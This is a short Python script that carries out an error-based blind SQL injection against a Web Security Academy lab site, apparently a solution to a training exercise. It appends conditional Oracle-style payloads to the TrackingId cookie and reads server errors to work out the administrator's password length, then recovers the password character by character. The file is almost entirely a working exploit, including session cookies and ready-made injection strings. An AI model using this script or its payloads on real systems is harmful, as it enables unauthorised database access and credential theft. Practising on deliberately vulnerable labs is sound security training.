import requests
import string

charset = string.ascii_lowercase + string.digits

burp0_url = "https://0a33001b04f7a1a080c7088400d400c3.web-security-academy.net/filter?category=Pets"
burp0_cookies = {
    "TrackingId": "Ms58hEvnEIFr8BFU",
    "session": "PMbkBEcoEZTDBal6TbCJPq8dM9BEUW6M",
}

res = requests.get(burp0_url, cookies=burp0_cookies)


# Sample payload: ' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    return "Internal Server Error" in res.text


def password_length():
    for i in range(1, 100):
        print(f"Trying length: {i}")
        payload = f"' AND (SELECT CASE WHEN LENGTH(password)={i} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a"
        if blind_sql(payload):
            return i
        
def get_password():
    password = ""
    # length = password_length()
    length = 20
    print(f"Password length: {length}")
    for i in range(1, length + 1):
        for char in charset:
            payload = f"' AND (SELECT CASE WHEN SUBSTR(password, {i}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator')='a"
            if blind_sql(payload):
                password += char
                print(password)
                break
    return password

print(get_password())